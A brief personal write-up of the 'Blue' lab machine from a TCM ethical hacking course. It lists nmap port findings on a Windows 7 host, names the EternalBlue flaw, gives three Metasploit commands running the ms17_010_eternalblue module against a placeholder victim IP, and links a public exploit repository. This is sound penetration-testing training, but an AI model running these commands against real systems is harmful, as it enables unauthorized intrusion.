# Blue (TCM)

- Machine from TCM Ethical Hacking Course
- March 12, 2023
- easy

---

## Enumeration

### Nmap

1. 135/msrpc - Microsoft Windows RPC
2. 139/netbios-ssn - Microsoft Windows netbios-ssn
3. 445/microsoft-ds - Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds

- windows 7 has famous exploit -> `Eternal Blue`

## System Access

- with metasploit

```sh
use windows/smb/ms17_010_eternalblue
set rhosts $victim_ip
run
```
- from github - https://github.com/3ndG4me/AutoBlue-MS17-010
- follow the steps

---